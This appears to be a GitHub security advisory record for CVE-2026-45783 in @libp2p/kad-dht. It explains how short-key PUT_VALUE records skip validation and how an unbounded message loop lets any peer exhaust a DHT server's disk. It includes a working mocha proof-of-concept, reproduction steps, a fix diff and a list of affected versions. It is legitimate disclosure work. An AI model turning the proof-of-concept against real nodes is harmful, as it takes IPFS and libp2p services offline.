@@ -1,0 +1,1140 @@
+advisory_id: GHSA-32mq-hpph-xfvr
+datasource_id: github_osv/GHSA-32mq-hpph-xfvr
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-32mq-hpph-xfvr/GHSA-32mq-hpph-xfvr.json
+aliases:
+  - CVE-2026-45783
+summary: "@libp2p/kad-dht: Unvalidated PUT_VALUE records allow unbounded disk exhaustion on\
+  \ DHT server nodes\n### Summary\nAn unauthenticated remote peer can exhaust the disk storage\
+  \ of any `@libp2p/kad-dht` node running in server mode by sending an unbounded stream of `PUT_VALUE`\
+  \ messages whose keys bypass all content validation. No credentials, no prior relationship,\
+  \ and no protocol deviation beyond a crafted key are required. The victim node's datastore\
+  \ fills until the host disk is exhausted, making the node unavailable.\n\n### Details\nTwo\
+  \ cooperating defects combine to produce the vulnerability.                           \n \
+  \                                                    \n**Defect 1: `verifyRecord` silent early-return\
+  \ (`packages/kad-dht/src/record/validators.ts:19-21`)**                                  \
+  \                                                                               \n       \
+  \                                                                                        \
+  \            \n```typescript                                                             \
+  \                                                                                        \
+  \                                                    \nexport async function verifyRecord(validators:\
+  \ Validators, record: Libp2pRecord, options?: AbortOptions): Promise<void> {             \
+  \                                                                                \n  const\
+  \ key = record.key                                                                       \
+  \            \n  const keyString = uint8ArrayToString(key)   // decode as UTF-8\n  const parts\
+  \ = keyString.split('/')                                                                 \
+  \      \n                                                                                \
+  \                           \n  if (parts.length < 3) {                                  \
+  \                                                                                        \
+  \                                                                   \n    // No validator\
+  \ available                                                                              \n\
+  \    return                          // <- silent success; record IS written to datastore\n\
+  \  }                                                                                     \
+  \                   \n  // ...                                             \n}           \
+  \                                                                                        \
+  \                                                                                        \
+  \                          \n```\n\nLegitimate DHT keys (`/pk/<multihash>`, `/ipns/<peerId>`)\
+  \ have exactly 3 slash-delimited parts and are routed to registered validators. Any key whose\
+  \ UTF-8 representation splits into fewer than 3 parts, single-byte keys, or any value without\
+  \ two `/` characters, thus, bypasses validation entirely and is written to the datastore unconditionally.\
+  \ There is no audit log and no error returned to the caller.\n\n**Defect 2: Unbounded RPC\
+  \ message loop (`packages/kad-dht/src/rpc/index.ts:103-152`)**                           \
+  \                                                                                        \
+  \            \n                                                                          \
+  \                                                                                        \
+  \                                                    \n```typescript                     \
+  \                                                                         \nlet signal = AbortSignal.timeout(this.incomingMessageTimeout)\
+  \  // 10 s inactivity timer\nsignal.addEventListener('abort', abortListener)      \nconst\
+  \ messages = pbStream(stream).pb(Message)  // DEFAULT_MAX_DATA_LENGTH = 4 MB\n\nwhile (true)\
+  \ {\n  if (stream.readStatus !== 'readable') { await stream.close({ signal }); break }\n \
+  \ const message = await messages.read({ signal })\n  await this.handleMessage(connection.remotePeer,\
+  \ message)\n  // ...\n  signal.removeEventListener('abort', abortListener)\n  signal = AbortSignal.timeout(this.incomingMessageTimeout)\
+  \  // timer RESET each message\n  signal.addEventListener('abort', abortListener)\n}\n```\n\
+  \nThe inactivity timeout is reset after **every successfully received message**. There is\
+  \ no per-stream message count limit, no per-peer byte budget, and no rate limiter. An attacker\
+  \ who delivers each message within the 10-second window can stream an unlimited number of\
+  \ messages indefinitely.\n\n**Combined impact**\n\n- `DEFAULT_MAX_DATA_LENGTH = 4 MB` per\
+  \ message (from `@libp2p/utils`)\n- `DEFAULT_MAX_INBOUND_STREAMS = 32` concurrent streams\
+  \ per `kad-dht` instance\n- Attack throughput: 4 MB × unlimited messages × 32 streams\n- Minimum\
+  \ attacker cost: standard libp2p TLS handshake (no authentication beyond that)\n\n**Differential\
+  \ note**: `go-libp2p-kad-dht` enforces `record.Validator.Validate()` per-key at the RPC layer;\
+  \ records with unrecognised namespaces are rejected with an error, not silently stored. This\
+  \ divergence is JS-specific.\n\n### PoC\nThe proof-of-concept is a mocha test checked in alongside\
+  \ the package test suite. It uses an in-memory stream pair, thus, no network traffic, no external\
+  \ connections.\n\n**File**: `packages/kad-dht/test/rpc/poc-put-value-unvalidated.spec.ts`:\n\
+  \n```typescript\n/**\n * PoC: kad-dht PUT_VALUE stored without validation for keys with <\
+  \ 3 slash-separated parts\n *\n * Affected: packages/kad-dht/src/record/validators.ts:19-22\n\
+  \ *           packages/kad-dht/src/rpc/handlers/put-value.ts\n *           packages/kad-dht/src/rpc/index.ts\
+  \ (unbounded while loop)\n */\n\n/* eslint-env mocha */\n\nimport assert from 'node:assert'\n\
+  import { start } from '@libp2p/interface'\nimport { defaultLogger } from '@libp2p/logger'\n\
+  import { persistentPeerStore } from '@libp2p/peer-store'\nimport { Libp2pRecord } from '@libp2p/record'\n\
+  import { streamPair } from '@libp2p/utils'\nimport { MemoryDatastore } from 'datastore-core'\n\
+  import * as lp from 'it-length-prefixed'\nimport { TypedEventEmitter } from 'main-event'\n\
+  import pDefer from 'p-defer'\nimport Sinon from 'sinon'\nimport { stubInterface } from 'sinon-ts'\n\
+  import { StreamMessageEvent } from '@libp2p/interface'\nimport { toString as uint8ArrayToString\
+  \ } from 'uint8arrays/to-string'\nimport { Message, MessageType } from '../../src/message/dht.js'\n\
+  import { PeerRouting } from '../../src/peer-routing/index.js'\nimport { Providers } from '../../src/providers.js'\n\
+  import { RoutingTable } from '../../src/routing-table/index.js'\nimport { RPC } from '../../src/rpc/index.js'\n\
+  import { passthroughMapper } from '../../src/utils.js'\nimport { createPeerIdWithPrivateKey\
+  \ } from '../utils/create-peer-id.js'\nimport type { Validators } from '../../src/index.js'\n\
+  import type { RPCComponents } from '../../src/rpc/index.js'\nimport type { Connection, Libp2pEvents\
+  \ } from '@libp2p/interface'\nimport type { AddressManager } from '@libp2p/interface-internal'\n\
+  import type { Datastore } from 'interface-datastore'\n\ndescribe('PoC: PUT_VALUE stores data\
+  \ without validation for short keys', function () {\n  this.timeout(15_000)\n\n  let rpc:\
+  \ RPC\n  let datastore: Datastore\n\n  beforeEach(async () => {\n    const peerId = await\
+  \ createPeerIdWithPrivateKey()\n    datastore = new MemoryDatastore()\n\n    const components:\
+  \ RPCComponents = {\n      peerId: peerId.peerId,\n      datastore,\n      peerStore: stubInterface(),\n\
+  \      addressManager: stubInterface<AddressManager>(),\n      logger: defaultLogger()\n \
+  \   }\n    components.peerStore = persistentPeerStore({\n      ...components,\n      events:\
+  \ new TypedEventEmitter<Libp2pEvents>()\n    })\n\n    await start(...Object.values(components))\n\
+  \n    // Default validators: only 'pk' and 'ipns' in production.\n    // Empty {} means: any\
+  \ key with ≥3 parts but unknown type throws; any key\n    // with <3 parts silently passes\
+  \ (the bypass under test).\n    const validators: Validators = {}\n\n    rpc = new RPC(components,\
+  \ {\n      routingTable: Sinon.createStubInstance(RoutingTable),\n      providers: Sinon.createStubInstance(Providers),\n\
+  \      peerRouting: Sinon.createStubInstance(PeerRouting),\n      validators,\n      logPrefix:\
+  \ '',\n      metricsPrefix: '',\n      datastorePrefix: '',\n      peerInfoMapper: passthroughMapper\n\
+  \    })\n  })\n\n  it('BYPASS: verifyRecord returns early for key with < 3 slash-delimited\
+  \ parts', async () => {\n    // Key bytes that, when decoded as UTF-8, produce a string with\
+  \ only 1 part\n    // when split on '/': [0x01, 0x02, 0x03] → \"\\x01\\x02\\x03\" → length\
+  \ 1 < 3\n    const craftedKey = new Uint8Array([0x01, 0x02, 0x03])\n    const keyStr = uint8ArrayToString(craftedKey)\n\
+  \    const parts = keyStr.split('/')\n    assert.ok(parts.length < 3,\n      `key produces\
+  \ ${parts.length} parts — expected < 3 for bypass`)\n\n    const PAYLOAD_SIZE = 64 * 1024\
+  \  // 64 KB — replace with 4 * 1024 * 1024 for full impact\n    const largeValue = new Uint8Array(PAYLOAD_SIZE).fill(0xAB)\n\
+  \n    const record = new Libp2pRecord(craftedKey, largeValue, new Date())\n    const encodedRecord\
+  \ = record.serialize()\n\n    const msg: Partial<Message> = {\n      type: MessageType.PUT_VALUE,\n\
+  \      key: craftedKey,\n      record: encodedRecord\n    }\n\n    // Confirm datastore is\
+  \ empty before the attack\n    const before: string[] = []\n    for await (const { key } of\
+  \ datastore.query({})) {\n      before.push(key.toString())\n    }\n    assert.strictEqual(before.filter(k\
+  \ => k.includes('/record/')).length, 0,\n      'datastore must be empty before attack')\n\n\
+  \    // Open an in-memory stream pair.\n    // outboundStream = attacker; incomingStream =\
+  \ victim.\n    const [outboundStream, incomingStream] = await streamPair()\n\n    // Wait\
+  \ for the echoed response (PUT_VALUE handler returns the message).\n    // This confirms the\
+  \ victim processed the message before we check the store.\n    const responseReceived = pDefer<void>()\n\
+  \    outboundStream.addEventListener('message', (evt) => {\n      // LP-decode the response\
+  \ and verify it's our PUT_VALUE echo\n      for (const buf of lp.decode([(evt as StreamMessageEvent).data]))\
+  \ {\n        const response = Message.decode(buf)\n        if (response.type === MessageType.PUT_VALUE)\
+  \ {\n          responseReceived.resolve()\n        }\n      }\n    })\n\n    // Schedule message\
+  \ send after victim starts listening (mirrors existing test pattern)\n    queueMicrotask(()\
+  \ => {\n      outboundStream.send(lp.encode.single(Message.encode(msg)))\n    })\n\n    //\
+  \ Start victim processing — do not await yet\n    const victimDone = rpc.onIncomingStream(\n\
+  \      incomingStream,\n      stubInterface<Connection>()\n    )\n\n    // Wait until the\
+  \ victim has processed and echoed the message\n    await responseReceived.promise\n\n    //\
+  \ Verify: arbitrary record was stored\n    const after: string[] = []\n    for await (const\
+  \ { key } of datastore.query({})) {\n      after.push(key.toString())\n    }\n    const dhtRecordsAfter\
+  \ = after.filter(k => k.includes('/record/'))\n\n    assert.ok(dhtRecordsAfter.length > 0,\n\
+  \      'VULNERABILITY CONFIRMED: arbitrary record stored without validation')\n\n    console.log(`\\\
+  n[PoC] Datastore key written:  ${dhtRecordsAfter[0]}`)\n    console.log(`[PoC] Bypassed validator\
+  \ with: key=[${Array.from(craftedKey).map(b => `0x${b.toString(16)}`).join(',')}]`)\n    console.log(`[PoC]\
+  \ Payload stored:          ${PAYLOAD_SIZE} bytes (${PAYLOAD_SIZE / 1024} KB)`)\n\n    // Clean\
+  \ up: abort the stream so victimDone resolves\n    incomingStream.abort(new Error('test cleanup'))\n\
+  \    await victimDone.catch(() => {})\n  })\n\n  it('RATE: N PUT_VALUE writes with different\
+  \ keys grow the datastore unchecked', async () => {\n    const MESSAGES = 8\n    const VALUE_SIZE\
+  \ = 16 * 1024  // 16 KB each\n\n    for (let i = 0; i < MESSAGES; i++) {\n      // Unique\
+  \ key per message → unique datastore entry per write\n      const craftedKey = new Uint8Array([0x10,\
+  \ (i >> 8) & 0xFF, i & 0xFF])\n      const value = new Uint8Array(VALUE_SIZE).fill(i & 0xFF)\n\
+  \      const record = new Libp2pRecord(craftedKey, value, new Date())\n\n      const msg:\
+  \ Partial<Message> = {\n        type: MessageType.PUT_VALUE,\n        key: craftedKey,\n \
+  \       record: record.serialize()\n      }\n\n      const [outboundStream, incomingStream]\
+  \ = await streamPair()\n\n      const responseReceived = pDefer<void>()\n      outboundStream.addEventListener('message',\
+  \ () => { responseReceived.resolve() })\n\n      queueMicrotask(() => { outboundStream.send(lp.encode.single(Message.encode(msg)))\
+  \ })\n      const victimDone = rpc.onIncomingStream(incomingStream, stubInterface<Connection>())\n\
+  \n      await responseReceived.promise\n      incomingStream.abort(new Error('test cleanup'))\n\
+  \      await victimDone.catch(() => {})\n    }\n\n    const keys: string[] = []\n    for await\
+  \ (const { key } of datastore.query({})) {\n      keys.push(key.toString())\n    }\n    const\
+  \ dhtRecords = keys.filter(k => k.includes('/record/'))\n\n    assert.strictEqual(dhtRecords.length,\
+  \ MESSAGES,\n      `expected ${MESSAGES} records stored`)\n\n    const totalKB = (MESSAGES\
+  \ * VALUE_SIZE) / 1024\n    console.log(`\\n[PoC] ${MESSAGES} records stored → ${totalKB}\
+  \ KB written`)\n    console.log('[PoC] No per-peer write budget. No per-stream message count\
+  \ limit.')\n    console.log('[PoC] Production impact: 4 MB/msg × N msgs per stream × 32 streams\
+  \ = disk exhaustion.')\n  })\n})\n```\n\n**Steps to reproduce** (tested on commit `15eeedba13846e55e8fc3f9e4c49af18fa185ea4`):\n\
+  \n```bash\ngit clone https://github.com/libp2p/js-libp2p.git\ncd js-libp2p\nnpm install\n\
+  cd packages/kad-dht\nnpx aegir build\nnode --experimental-vm-modules ../../node_modules/.bin/mocha\
+  \ \\\n  'dist/test/rpc/poc-put-value-unvalidated.spec.js' --timeout 30000\n```\n\n**Expected\
+  \ output**:\n\n```\nPoC: PUT_VALUE stores data without validation for short keys\n\n[PoC]\
+  \ Datastore key written:  /record/aebag\n[PoC] Bypassed validator with: key=[0x1,0x2,0x3]\n\
+  [PoC] Payload stored:          65536 bytes (64 KB)\n    ✔ BYPASS: verifyRecord returns early\
+  \ for key with < 3 slash-delimited parts\n\n[PoC] 8 records stored → 128 KB written\n[PoC]\
+  \ No per-peer write budget. No per-stream message count limit.\n[PoC] Production impact: 4\
+  \ MB/msg × N msgs per stream × 32 streams = disk exhaustion.\n    ✔ RATE: N PUT_VALUE writes\
+  \ with different keys grow the datastore unchecked\n\n2 passing (44ms)\n```\n\n**Test 1**\
+  \ (`BYPASS`) confirms that a single `PUT_VALUE` message with a 3-byte raw key stores a 64\
+  \ KB payload in the victim's datastore with no validation.\n\n**Test 2** (`RATE`) confirms\
+  \ that N sequential writes with distinct keys each produce a new datastore entry, demonstrating\
+  \ the absence of any write budget or deduplication defence.\n\n### Impact\n**Affected deployments**:\
+  \ any `@libp2p/kad-dht` node in **server mode** (`clientMode: false`). Server mode is the\
+  \ default for nodes with publicly routable addresses; the `kad-dht` module auto-switches to\
+  \ server mode (`kad-dht.ts:340-358`). This includes:\n- IPFS nodes (kubo, Helia, any JS IPFS\
+  \ implementation)\n- libp2p bootstrap nodes\n- Any application exposing a public DHT endpoint\n\
+  \n**Not affected**: DHT client-mode nodes, `setMode('client')` calls `registrar.unhandle(this.protocol)`\
+  \ which removes the inbound stream handler entirely.\n\n**Availability (disk)**: attacker\
+  \ fills the victim's datastore partition. A full datastore prevents the victim from writing\
+  \ new DHT records, peer store entries, or any other application data sharing the same datastore\
+  \ backend (common in IPFS nodes using a shared `repo` datastore). Node becomes unavailable.\n\
+  \n**No authentication barrier**: the only prerequisite is a successful libp2p connection handshake\
+  \ (TLS). Any publicly reachable node is exposed.\n\n**Suggested minimum fix**:\nChange the\
+  \ silent early-return to a hard rejection:\n                                             \
+  \                                                              \n```diff\n-  if (parts.length\
+  \ < 3) {\n-    // No validator available\n-    return\n-  }\n+  if (parts.length < 3) {\n\
+  +    throw new InvalidParametersError(`Record key has no recognisable namespace: refusing\
+  \ to store`)\n+  }\n```"
+impacted_packages:
+  - purl: pkg:npm/%40libp2p/kad-dht
+    affected_versions: vers:npm/<16.2.6
+    fixed_versions: vers:npm/16.2.6
+    affected_packages:
+      - pkg:npm/%40libp2p/kad-dht@0.28.6
+      - pkg:npm/%40libp2p/kad-dht@0.28.7
+      - pkg:npm/%40libp2p/kad-dht@1.0.0
+      - pkg:npm/%40libp2p/kad-dht@1.0.1
+      - pkg:npm/%40libp2p/kad-dht@1.0.2
+      - pkg:npm/%40libp2p/kad-dht@1.0.3
+      - pkg:npm/%40libp2p/kad-dht@1.0.4
+      - pkg:npm/%40libp2p/kad-dht@1.0.5
+      - pkg:npm/%40libp2p/kad-dht@1.0.6
+      - pkg:npm/%40libp2p/kad-dht@1.0.7
+      - pkg:npm/%40libp2p/kad-dht@1.0.8
+      - pkg:npm/%40libp2p/kad-dht@1.0.9
+      - pkg:npm/%40libp2p/kad-dht@1.0.10
+      - pkg:npm/%40libp2p/kad-dht@1.0.11
+      - pkg:npm/%40libp2p/kad-dht@1.0.12
+      - pkg:npm/%40libp2p/kad-dht@1.0.13
+      - pkg:npm/%40libp2p/kad-dht@1.0.14
+      - pkg:npm/%40libp2p/kad-dht@1.0.15
+      - pkg:npm/%40libp2p/kad-dht@1.0.16
+      - pkg:npm/%40libp2p/kad-dht@2.0.0
+      - pkg:npm/%40libp2p/kad-dht@3.0.0
+      - pkg:npm/%40libp2p/kad-dht@3.0.1
+      - pkg:npm/%40libp2p/kad-dht@3.0.2
+      - pkg:npm/%40libp2p/kad-dht@3.0.3
+      - pkg:npm/%40libp2p/kad-dht@3.0.4
+      - pkg:npm/%40libp2p/kad-dht@3.0.5
+      - pkg:npm/%40libp2p/kad-dht@3.0.6
+      - pkg:npm/%40libp2p/kad-dht@3.1.0
+      - pkg:npm/%40libp2p/kad-dht@4.0.0
+      - pkg:npm/%40libp2p/kad-dht@4.0.1
+      - pkg:npm/%40libp2p/kad-dht@4.0.2
+      - pkg:npm/%40libp2p/kad-dht@5.0.0
+      - pkg:npm/%40libp2p/kad-dht@5.0.1
+      - pkg:npm/%40libp2p/kad-dht@5.0.2
+      - pkg:npm/%40libp2p/kad-dht@6.0.0
+      - pkg:npm/%40libp2p/kad-dht@6.0.1
+      - pkg:npm/%40libp2p/kad-dht@6.0.2
+      - pkg:npm/%40libp2p/kad-dht@6.0.3
+      - pkg:npm/%40libp2p/kad-dht@6.0.4
+      - pkg:npm/%40libp2p/kad-dht@6.1.0
+      - pkg:npm/%40libp2p/kad-dht@6.1.1
+      - pkg:npm/%40libp2p/kad-dht@7.0.0
+      - pkg:npm/%40libp2p/kad-dht@7.0.1
+      - pkg:npm/%40libp2p/kad-dht@7.0.2
+      - pkg:npm/%40libp2p/kad-dht@7.0.3
+      - pkg:npm/%40libp2p/kad-dht@8.0.0
+      - pkg:npm/%40libp2p/kad-dht@8.0.1
+      - pkg:npm/%40libp2p/kad-dht@8.0.2
+      - pkg:npm/%40libp2p/kad-dht@8.0.3
+      - pkg:npm/%40libp2p/kad-dht@8.0.4
+      - pkg:npm/%40libp2p/kad-dht@8.0.5
+      - pkg:npm/%40libp2p/kad-dht@8.0.6
+      - pkg:npm/%40libp2p/kad-dht@8.0.7
+      - pkg:npm/%40libp2p/kad-dht@8.0.8
+      - pkg:npm/%40libp2p/kad-dht@8.0.9
+      - pkg:npm/%40libp2p/kad-dht@8.0.10
+      - pkg:npm/%40libp2p/kad-dht@8.0.11
+      - pkg:npm/%40libp2p/kad-dht@8.0.12
+      - pkg:npm/%40libp2p/kad-dht@9.0.0
+      - pkg:npm/%40libp2p/kad-dht@9.1.0
+      - pkg:npm/%40libp2p/kad-dht@9.1.1
+      - pkg:npm/%40libp2p/kad-dht@9.1.2
+      - pkg:npm/%40libp2p/kad-dht@9.1.3
+      - pkg:npm/%40libp2p/kad-dht@9.1.4
+      - pkg:npm/%40libp2p/kad-dht@9.1.5
+      - pkg:npm/%40libp2p/kad-dht@9.2.0
+      - pkg:npm/%40libp2p/kad-dht@9.3.0
+      - pkg:npm/%40libp2p/kad-dht@9.3.1
+      - pkg:npm/%40libp2p/kad-dht@9.3.2
+      - pkg:npm/%40libp2p/kad-dht@9.3.3
+      - pkg:npm/%40libp2p/kad-dht@9.3.4
+      - pkg:npm/%40libp2p/kad-dht@9.3.5
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-05abd49f
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-06f4901a
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-1f7e18b0
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-2e561fe9
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-3dfc236e
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-42c1c097
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-5315f7bc
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-562f9b08
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-57c32721
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-5eee70a4
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-69c93ac5
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-6eab9c5e
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-6fdaa7dc
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-791f56f0
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-7b5c54dd
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-7debe031
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-7f60b579
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-7fb23cd3
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-85a317bb
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-879f4794
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-8b0e6bef
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-a1ec46b5
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-a41d25d4
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-ab0e3980
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-b1024c6c
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-b36ec7f2
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-c2232166
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-c999d6a7
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-d853d124
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-daeb43d8
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-e9cafd3d
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-ea8a0637
+      - pkg:npm/%40libp2p/kad-dht@9.3.6-f427cfc9
+      - pkg:npm/%40libp2p/kad-dht@9.3.6
+      - pkg:npm/%40libp2p/kad-dht@9.3.7
+      - pkg:npm/%40libp2p/kad-dht@9.3.8
+      - pkg:npm/%40libp2p/kad-dht@10.0.0-58421e11
+      - pkg:npm/%40libp2p/kad-dht@10.0.0-5ffa7a74
+      - pkg:npm/%40libp2p/kad-dht@10.0.0-72e81dc1
+      - pkg:npm/%40libp2p/kad-dht@10.0.0-8d49602f
+      - pkg:npm/%40libp2p/kad-dht@10.0.0-8f681db3
+      - pkg:npm/%40libp2p/kad-dht@10.0.0-8f855a3c
+      - pkg:npm/%40libp2p/kad-dht@10.0.0-a4a10fd4
+      - pkg:npm/%40libp2p/kad-dht@10.0.0-c858ca7f
+      - pkg:npm/%40libp2p/kad-dht@10.0.0-e66f4891
+      - pkg:npm/%40libp2p/kad-dht@10.0.0-ef83dd1d
+      - pkg:npm/%40libp2p/kad-dht@10.0.0-fdd80820
+      - pkg:npm/%40libp2p/kad-dht@10.0.0
+      - pkg:npm/%40libp2p/kad-dht@10.0.1-446fff87
+      - pkg:npm/%40libp2p/kad-dht@10.0.1
+      - pkg:npm/%40libp2p/kad-dht@10.0.2-32212959
+      - pkg:npm/%40libp2p/kad-dht@10.0.2-02b89323
+      - pkg:npm/%40libp2p/kad-dht@10.0.2-123ded59
+      - pkg:npm/%40libp2p/kad-dht@10.0.2-18567b7c
+      - pkg:npm/%40libp2p/kad-dht@10.0.2-3345f28b
+      - pkg:npm/%40libp2p/kad-dht@10.0.2-364e0592
+      - pkg:npm/%40libp2p/kad-dht@10.0.2-4c1a33b3
+      - pkg:npm/%40libp2p/kad-dht@10.0.2-5e85154b
+      - pkg:npm/%40libp2p/kad-dht@10.0.2-6b839807
+      - pkg:npm/%40libp2p/kad-dht@10.0.2-9c0353cf
+      - pkg:npm/%40libp2p/kad-dht@10.0.2-a1fbb7e2
+      - pkg:npm/%40libp2p/kad-dht@10.0.2-a31b420f
+      - pkg:npm/%40libp2p/kad-dht@10.0.2-e26848b0
+      - pkg:npm/%40libp2p/kad-dht@10.0.2-eaac8943
+      - pkg:npm/%40libp2p/kad-dht@10.0.2
+      - pkg:npm/%40libp2p/kad-dht@10.0.3-87165551
+      - pkg:npm/%40libp2p/kad-dht@10.0.3-4ef9c79c
+      - pkg:npm/%40libp2p/kad-dht@10.0.3-6abcd22f
+      - pkg:npm/%40libp2p/kad-dht@10.0.3-7b2ddc17
+      - pkg:npm/%40libp2p/kad-dht@10.0.3-87dc7e9f
+      - pkg:npm/%40libp2p/kad-dht@10.0.3-d30f09f2
+      - pkg:npm/%40libp2p/kad-dht@10.0.3-d9948596
+      - pkg:npm/%40libp2p/kad-dht@10.0.3-e664d14f
+      - pkg:npm/%40libp2p/kad-dht@10.0.3
+      - pkg:npm/%40libp2p/kad-dht@10.0.4-89778624
+      - pkg:npm/%40libp2p/kad-dht@10.0.4-098ba082
+      - pkg:npm/%40libp2p/kad-dht@10.0.4-24c1c248
+      - pkg:npm/%40libp2p/kad-dht@10.0.4-6a02d765
+      - pkg:npm/%40libp2p/kad-dht@10.0.4-725f5df1
+      - pkg:npm/%40libp2p/kad-dht@10.0.4-b599905c
+      - pkg:npm/%40libp2p/kad-dht@10.0.4-f3fd7b62
+      - pkg:npm/%40libp2p/kad-dht@10.0.4
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-32825633
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-01acccef
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-0634e3b7
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-0d228f9f
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-10cbc8fa
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-13f5b48e
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-24a5edae
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-28d6722f
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-2b755a82
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-4559a624
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-46dc3ce9
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-5294f14c
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-63041afe
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-73b87c5a
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-7517082d
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-9a69e6f7
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-a533cc39
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-a6be8f0f
+      - pkg:npm/%40libp2p/kad-dht@10.0.5-c4eff4c5
+      - pkg:npm/%40libp2p/kad-dht@10.0.5
+      - pkg:npm/%40libp2p/kad-dht@10.0.6-0ce318ec
+      - pkg:npm/%40libp2p/kad-dht@10.0.6-0ee4f784
+      - pkg:npm/%40libp2p/kad-dht@10.0.6-122f1e67
+      - pkg:npm/%40libp2p/kad-dht@10.0.6-20d5f220
+      - pkg:npm/%40libp2p/kad-dht@10.0.6-4db2f5f5
+      - pkg:npm/%40libp2p/kad-dht@10.0.6-88c47f51
+      - pkg:npm/%40libp2p/kad-dht@10.0.6-d9159dd5
+      - pkg:npm/%40libp2p/kad-dht@10.0.6
+      - pkg:npm/%40libp2p/kad-dht@10.0.7-6640116d
+      - pkg:npm/%40libp2p/kad-dht@10.0.7-6cb80f7d
+      - pkg:npm/%40libp2p/kad-dht@10.0.7-72319fe6
+      - pkg:npm/%40libp2p/kad-dht@10.0.7-91842c93
+      - pkg:npm/%40libp2p/kad-dht@10.0.7-972b10a9
+      - pkg:npm/%40libp2p/kad-dht@10.0.7-ae36e86b
+      - pkg:npm/%40libp2p/kad-dht@10.0.7-b57bca44
+      - pkg:npm/%40libp2p/kad-dht@10.0.7-e3ab1929
+      - pkg:npm/%40libp2p/kad-dht@10.0.7-f09ac4a7
+      - pkg:npm/%40libp2p/kad-dht@10.0.7
+      - pkg:npm/%40libp2p/kad-dht@10.0.8-28794fe4
+      - pkg:npm/%40libp2p/kad-dht@10.0.8-5a6a4379
+      - pkg:npm/%40libp2p/kad-dht@10.0.8-7d8b1551
+      - pkg:npm/%40libp2p/kad-dht@10.0.8-96166ada
+      - pkg:npm/%40libp2p/kad-dht@10.0.8-980857c3
+      - pkg:npm/%40libp2p/kad-dht@10.0.8-c88de8e1
+      - pkg:npm/%40libp2p/kad-dht@10.0.8-c97dea04
+      - pkg:npm/%40libp2p/kad-dht@10.0.8-e8123d3f
+      - pkg:npm/%40libp2p/kad-dht@10.0.8-e9099d40
+      - pkg:npm/%40libp2p/kad-dht@10.0.8-f1053159
+      - pkg:npm/%40libp2p/kad-dht@10.0.8-f670307a
+      - pkg:npm/%40libp2p/kad-dht@10.0.8
+      - pkg:npm/%40libp2p/kad-dht@10.0.9-68504939
+      - pkg:npm/%40libp2p/kad-dht@10.0.9-62a56b54
+      - pkg:npm/%40libp2p/kad-dht@10.0.9-7534ae7b
+      - pkg:npm/%40libp2p/kad-dht@10.0.9-77e3cbc3
+      - pkg:npm/%40libp2p/kad-dht@10.0.9-ab2c1f67
+      - pkg:npm/%40libp2p/kad-dht@10.0.9-b5a808af
+      - pkg:npm/%40libp2p/kad-dht@10.0.9-cf3ae893
+      - pkg:npm/%40libp2p/kad-dht@10.0.9-f9d1c072
+      - pkg:npm/%40libp2p/kad-dht@10.0.9
+      - pkg:npm/%40libp2p/kad-dht@10.0.10-50f912c2
+      - pkg:npm/%40libp2p/kad-dht@10.0.10
+      - pkg:npm/%40libp2p/kad-dht@10.0.11-69581367
+      - pkg:npm/%40libp2p/kad-dht@10.0.11-025c082a
+      - pkg:npm/%40libp2p/kad-dht@10.0.11-16a87076
+      - pkg:npm/%40libp2p/kad-dht@10.0.11-346ff5a2
+      - pkg:npm/%40libp2p/kad-dht@10.0.11-50442d7a
+      - pkg:npm/%40libp2p/kad-dht@10.0.11-7903d7a5
+      - pkg:npm/%40libp2p/kad-dht@10.0.11-b686fb5a
+      - pkg:npm/%40libp2p/kad-dht@10.0.11-d5ef1c91
+      - pkg:npm/%40libp2p/kad-dht@10.0.11
+      - pkg:npm/%40libp2p/kad-dht@10.0.12-051154dd
+      - pkg:npm/%40libp2p/kad-dht@10.0.12-1d141331a
+      - pkg:npm/%40libp2p/kad-dht@10.0.12-78db573f9
+      - pkg:npm/%40libp2p/kad-dht@10.0.12-8b82e68e8
+      - pkg:npm/%40libp2p/kad-dht@10.0.12-d25d9510
